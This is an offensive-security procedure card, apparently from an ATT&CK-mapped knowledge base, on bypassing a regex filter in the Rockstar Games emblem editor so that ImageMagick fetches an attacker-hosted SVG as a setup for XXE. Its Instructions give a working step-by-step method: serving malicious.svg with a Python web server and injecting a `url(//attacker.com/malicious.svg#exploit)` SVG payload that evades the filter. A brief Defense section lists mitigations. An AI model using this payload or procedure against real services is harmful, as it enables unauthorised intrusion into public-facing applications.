---
id: proc-uuid-001
name: Bypass-Regex-Filter-for-External-SVG-Loading
tags:
  - xxe
  - svg
  - filter-bypass
type: procedure
tools:
  - '[[tools/ImageMagick]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.435Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-Regex-Filter-for-External-SVG-Loading

## Summary

This procedure bypasses a regex-based filter in the Rockstar Games emblem editor to load external SVG content hosted on an attacker's server, setting the stage for XXE exploitation by allowing ImageMagick to process untrusted inputs.

## Description

The emblem editor uses a regex filter to block external URL references in SVG inputs, but it can be evaded using double forward slashes (//) to mimic SMB paths or relative URLs. This loads a malicious SVG from the attacker's server, which ImageMagick then processes during PNG conversion, enabling subsequent XXE or XInclude attacks. The target environment is a web-based editor on a Windows server running vulnerable ImageMagick.

## Requirements

1. Access to the Rockstar Games emblem editor via a user account
2. A web server to host the malicious SVG (e.g., attacker.com)
3. Knowledge of the filter's regex pattern (blocks standard http:// but not // paths)

## Defense

Defensive measures and detection strategies:

- Implement strict allowlisting for SVG attributes and block all external references
- Update ImageMagick to a version with XXE disabled (e.g., via --without-lcms2 or policy.xml restrictions)
- Monitor for unusual HTTP requests to external domains from the server

## Objectives

1. Load external malicious SVG without filter rejection
2. Prepare for XXE payload injection
3. Enable processing of attacker-controlled content by ImageMagick

## Instructions

### Step 1: Host Malicious SVG

**Context**: Set up a server to serve the initial malicious SVG file.

Start a simple web server on your machine:

```bash
python -m http.server 80
```

Place malicious.svg in the server root.

> This hosts the file at http://attacker.com/malicious.svg, accessible to the target.

### Step 2: Craft Bypass Payload

**Context**: Embed a URL reference using double slashes to evade the regex.

In the emblem editor's SVG input, use:

```xml
<rect fill="url(//attacker.com/malicious.svg#exploit)" x="0" y="0" width="100" height="100"/>
```

> The // tricks the filter into treating it as a non-http path, loading the external file.

### Step 3: Submit and Verify

**Context**: Submit the input and check if the external SVG loads.

Click submit in the editor and inspect the rendered preview.

> Successful bypass shows no error and processes the external content.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/ImageMagick]]

## Tags

- [[xxe]]
- [[svg]]
- [[filter-bypass]]
